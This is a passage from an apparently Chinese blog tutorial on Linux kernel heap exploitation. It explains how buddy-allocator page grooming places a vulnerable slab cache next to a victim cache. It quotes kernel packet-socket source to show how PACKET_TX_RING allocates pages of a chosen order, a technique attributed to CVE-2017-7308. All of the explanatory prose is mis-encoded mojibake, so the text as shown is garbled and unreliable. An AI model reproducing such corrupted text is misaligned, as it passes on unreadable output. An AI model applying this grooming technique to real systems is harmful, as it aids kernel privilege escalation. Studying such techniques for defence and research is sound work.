¸å†…å­˜é¡µçš„æ’å¸ƒå¯¹æˆ‘ä»¬æ¥è¯´ä¸ä»…æœªçŸ¥ä¸”ä¿¡æ¯é‡å·¨å¤§ï¼Œå› æ­¤è¿™ç§åˆ©ç”¨æ‰‹æ³•å®é™…ä¸Šæ˜¯è®©æˆ‘ä»¬æ‰‹å·¥æ„é€ ä¸€ä¸ªæ–°çš„å·²çŸ¥çš„é¡µçº§ç²’åº¦å†…å­˜é¡µæ’å¸ƒã€‚</p><p>åœ¨ä¸Šè¿°è§£é‡Šå®Œslabçš„åˆ†é…è¿‡ç¨‹æƒ³å¿…åº”è¯¥éƒ½èƒ½ç†è§£<code>buddy system</code>äº†ï¼Œä»–çš„åŸºæœ¬åŸç†å°±æ˜¯ä»¥ 2 çš„ order æ¬¡å¹‚å¼ å†…å­˜é¡µä½œä¸ºåˆ†é…ç²’åº¦ï¼Œç›¸åŒ order é—´ç©ºé—²é¡µé¢æ„æˆåŒå‘é“¾è¡¨ï¼Œå½“ä½é˜¶ order çš„é¡µé¢ä¸å¤Ÿç”¨æ—¶ä¾¿ä¼šä»é«˜é˜¶ order å–ä¸€ä»½è¿ç»­å†…å­˜é¡µæ‹†æˆä¸¤åŠï¼Œå…¶ä¸­ä¸€åŠæŒ‚å›å½“å‰è¯·æ±‚ order é“¾è¡¨ï¼Œå¦ä¸€åŠè¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼›ä¸‹å›¾ä¸ºä»¥ order 2 ä¸ºä¾‹çš„ buddy system é¡µé¢åˆ†é…åŸºæœ¬åŸç†ï¼ˆå·çš„å›¾ï¼‰ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/79biltjNfACIZcP.gif"                      alt="å·"                ></p><p>ä¸éš¾æƒ³åˆ°è¿™ä¸ªåˆ©ç”¨æ–¹å¼çš„åŸç†å°±æ˜¯ï¼šä»æ›´é«˜é˜¶ order æ‹†åˆ†æˆçš„ä¸¤ä»½ä½é˜¶ order çš„è¿ç»­å†…å­˜é¡µæ˜¯ç‰©ç†è¿ç»­çš„ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥ï¼š</p><ul><li>  å‘ buddy system è¯·æ±‚ä¸¤ä»½è¿ç»­çš„å†…å­˜é¡µ</li><li>  é‡Šæ”¾å…¶ä¸­ä¸€ä»½å†…å­˜é¡µï¼Œåˆ†é… <code>vulnerable kmem_cache</code> ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li><li>  é‡Šæ”¾å¦ä¸€ä»½å†…å­˜é¡µï¼Œä½¿ç”¨ <code>victim kmem_cache</code> å †å–·ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li></ul><p>é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>vulnerable kmem_cache</code>çš„<code>off by null</code>æˆ–<code>off by one</code>å»ä¿®æ”¹åˆ°<code>victim kmem_cache</code>äº†ã€‚</p><h3 id="åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page"><a href="#åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page" class="headerlink" title="åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page"></a>åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page</h3><p>æ ¹æ®ä¸Šè¿°å†…å®¹æ¥çœ‹ï¼Œæˆ‘ä»¬éœ€è¦æ¶ˆè€—æ‰å°<code>order</code>çš„é¡µé¢æ‰èƒ½ç»§ç»­è¿›è¡Œï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯ä»¥ç”³è¯·æŒ‡å®š<code>order</code>çš„APIã€‚è¿™é‡Œé€‰æ‹©æ˜¯<a class="link"   href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html" >CVE-2017-7308<i class="fas fa-external-link-alt"></i></a>ä¸­çš„æ–¹æ³•ã€‚</p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª <code>protocol</code> ä¸º <code>PF_PACKET</code> çš„ socket ä¹‹åï¼Œå…ˆè°ƒç”¨ <code>setsockopt()</code> å°† <code>PACKET_VERSION</code> è®¾ä¸º <code>TPACKET_V1 </code>/ <code>TPACKET_V2</code>ï¼Œå†è°ƒç”¨ <code>setsockopt()</code> æäº¤ä¸€ä¸ª <code>PACKET_TX_RING</code> ï¼Œæ­¤æ—¶ä¾¿å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><p><code>__sys_setsockopt</code>=&gt;<code>sock-&gt;ops-&gt;setsockopt</code>=&gt;<code>packet_setsockopt</code>=&gt;<code>packet_set_ring</code>=&gt;<code>alloc_pg_vec</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line"><span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">pg_vec = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯è¿™é‡Œ<code>alloc_pg_vec</code>å‡½æ•°é€šè¿‡<code>alloc_one_pg_vec_page</code>å‡½æ•°ç”³è¯·bufferã€‚å¹¶ä¸”è¿™é‡Œç”³è¯·çš„æ•°é‡ä¸º<code>req-&gt;tp_block_nr</code>è€Œreqæ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œç”³è¯·çš„æ•°é‡æ˜¯å¯æ§çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">alloc_one_pg_vec_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *buffer;</span><br><span class="line"><span class="keyword">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* complete and utter failure */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>alloc_one_pg_vec_page</code>å‡½æ•°ä½¿ç”¨<code>__get_free_pages</code>ç”³è¯·åˆ°pageã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">packet_setsockopt(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname, <span class="keyword">sockptr_t</span> optval,</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (optname) &#123;</span><br><span class="line"><span class="keyword">case</span> PACKET_ADD_MEMBERSHIP:</span><br><span class="line"><span class="keyword">case</span> PACKET_DROP_MEMBERSHIP:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_mreq_max</span> <span class="title">mreq</span>;</span></span><br><span class="line"><span class="keyword">int</span> len = optlen;</span><br><span class="line"><span class="built_in">memset</span>(&amp;mreq, <span class="number">0</span>, <span class="keyword">sizeof</span>(mreq));</span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="keyword">sizeof</span>(struct packet_mreq))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (len &gt; <span class="keyword">sizeof</span>(mreq))</span><br><span class="line">len = <span class="keyword">sizeof</span>(mreq);</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;mreq, optval, len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (len &lt; (mreq.mr_alen + offsetof(struct packet_mreq, mr_address)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (optname == PACKET_ADD_MEMBERSHIP)</span><br><span class="line">ret = packet_mc_add(sk, &amp;mreq);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = packet_mc_drop(sk, &amp;mreq);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line"><span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">ret = -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">    optname == PACKET_TX_RING);</span><br><span class="line">&#125;</span><br><span class="line">release_sock(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">      ... ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬çš„<code>optname</code>ä¸º<code>PACKET_TX_RING</code>æ—¶ä¼šè°ƒç”¨åˆ°<code>packet_set_ring</code>ï¼Œå› ä¸ºæ­¤æ—¶lençš„å…³ç³»ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®¾ç½®<code>po-&gt;tp_version</code>ä¸º<code>TPACKET_V1</code>/<code>TPACKET_V2</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PACKET_VERSION:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optlen != <span class="keyword">sizeof</span>(val))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;val, optval, <span class="keyword">sizeof</span>(val)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">switch</span> (val) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line">ret = -EBUSY;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">po-&gt;tp_version = val;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">release_sock(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æƒ³è¦ä¿®æ”¹åˆ°<code>po-&gt;tp_version</code>éœ€è¦è¿›å…¥åˆ°è¿™ä¸ªcaseï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸¤æ¬¡è°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *rx_owner_map = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> was_running, order = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> *<span class="title">rb_queue</span>;</span></span><br><span class="line">__be16 num;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="comment">/* Added to avoid minimal code churn */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> *<span class="title">req</span> =</span> &amp;req_u-&gt;req;</span><br><span class="line"></span><br><span class="line">rb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;</span><br><span class="line">rb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;</span><br><span class="line"></span><br><span class="line">err = -EBUSY;</span><br><span class="line"><span class="keyword">if</span> (!closing) &#123;</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (packet_read_pending(rb))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_frame_size;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">order = get_order(req-&gt;tp_block_size);</span><br><span class="line">pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">if</span> (closing || atomic_read(&amp;po-&gt;mapped) == <span class="number">0</span>) &#123;</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line">spin_lock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line">swap(rb-&gt;pg_vec, pg_vec);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;tp_version &lt;= TPACKET_V2)</span><br><span class="line">swap(rb-&gt;rx_owner_map, rx_owner_map);</span><br><span class="line">rb-&gt;frame_max = (req-&gt;tp_frame_nr - <span class="number">1</span>);</span><br><span class="line">rb-&gt;head = <span class="number">0</span>;</span><br><span class="line">rb-&gt;frame_size = req-&gt;tp_frame_size;</span><br><span class="line">spin_unlock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line"></span><br><span class="line">swap(rb-&gt;pg_vec_order, order);</span><br><span class="line">swap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);</span><br><span class="line"></span><br><span class="line">rb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;</span><br><span class="line">po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?</span><br><span class="line">tpacket_rcv : packet_rcv;</span><br><span class="line">skb_queue_purge(rb_queue);</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">pr_err(<span class="string">&quot;packet_mmap: vma is busy: %d\n&quot;</span>,</span><br><span class="line">       atomic_read(&amp;po-&gt;mapped));</span><br><span class="line">&#125;</span><br><span class="line">  ... ...</span><br><span class="line">out_free_pg_vec:</span><br><span class="line"><span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">bitmap_free(rx_owner_map);</span><br><span class="line">free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„orderæ˜¯ç”±<code>req-&gt;tp_block_size</code>ç¡®å®šçš„ï¼Œè€Œä¸”reqæ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç”³è¯·çš„pageçš„orderä¹Ÿæ˜¯å¯æ§çš„ã€‚å¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯åœ¨<code>if (closing || atomic_read(&amp;po-&gt;mapped) == 0)</code>è¿™ä¸ªæ¡ä»¶åˆ†æ”¯ä¸­ï¼Œä¼šäº¤æ¢<code>rb-&gt;pg_vec</code>ä¸­çš„å†…å®¹å’Œå½“å‰å‡½æ•°ä¸­å˜é‡<code>pg_vec</code>ä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥åœ¨æœ€åä¸ä¼šæ‰§è¡Œåˆ°<code>free_pg_vec</code>å‡½æ•°ã€‚</p><h3 id="é‡Šæ”¾"><a href="#é‡Šæ”¾" class="headerlink" title="é‡Šæ”¾"></a>é‡Šæ”¾</h3><p>è¿™é‡Œçš„é‡Šæ”¾æµç¨‹å¾ˆç®€å•ï¼š<code>packet_release</code>=&gt;<code>packet_set_ring</code>=&gt;<code>free_pg_vec</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_pg_vec</span><span class="params">(struct pgv *pg_vec, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (likely(pg_vec[i].buffer)) &#123;</span><br><span class="line"><span class="keyword">if</span> (is_vmalloc_addr(pg_vec[i].buffer))</span><br><span class="line">vfree(pg_vec[i].buffer);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">free_pages((<span class="keyword">unsigned</span> <span class="keyword">long</span>)pg_vec[i].buffer,</span><br><span class="line">   order);</span><br><span class="line">pg_vec[i].buffer = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kfree(pg_vec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å°±æ˜¯å°†é‡Œé¢çš„å†…å®¹ç»™é‡Šæ”¾æ‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_release</span><span class="params">(struct socket *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_fanout</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sk)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;rx_ring.pg_vec) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">  ... ...</span><br><span 